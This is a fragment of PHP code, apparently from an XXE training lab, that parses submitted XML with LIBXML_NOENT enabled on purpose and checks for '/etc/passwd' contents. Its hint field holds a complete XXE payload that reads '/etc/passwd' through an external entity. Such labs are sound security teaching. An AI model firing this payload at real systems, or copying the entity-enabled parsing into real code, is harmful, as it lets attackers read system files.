...
if ($xml) {
    ...
    else { $doc = new DOMDocument(); try { $doc->loadXML($xml, LIBXML_NOENT); $output = $doc->textContent; if (stripos($output,'root:') !== false) $passed = true; } catch (Exception $e) { $output = '解析错误'; } }
}
...
<?php
xxe_tail(['hint' => '注入外部实体读文件', 'full' => '<!DOCTYPE x[<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'], [
    '原理' => 'XXE第1关：外部实体读文件',
